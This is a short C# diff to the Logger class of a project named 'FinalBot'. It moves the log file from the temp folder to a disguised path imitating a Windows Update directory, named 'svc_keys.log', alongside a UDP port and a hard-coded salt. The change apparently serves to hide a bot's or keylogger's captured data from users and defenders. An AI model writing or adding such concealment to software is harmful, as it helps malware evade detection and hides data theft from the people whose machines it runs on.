@@ -8,7 +8,7 @@ namespace FinalBot
 {
     public static class Logger
     {
-        private static readonly string LogFile = Path.Combine(Path.GetTempPath(), "FinalBot_SysLog.txt");
+        private static readonly string LogFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
         private static readonly object _lock = new object();
         private const int UdpPort = 51337;
         private static readonly string Salt = "n2xkNQYbZwj8r9fz";
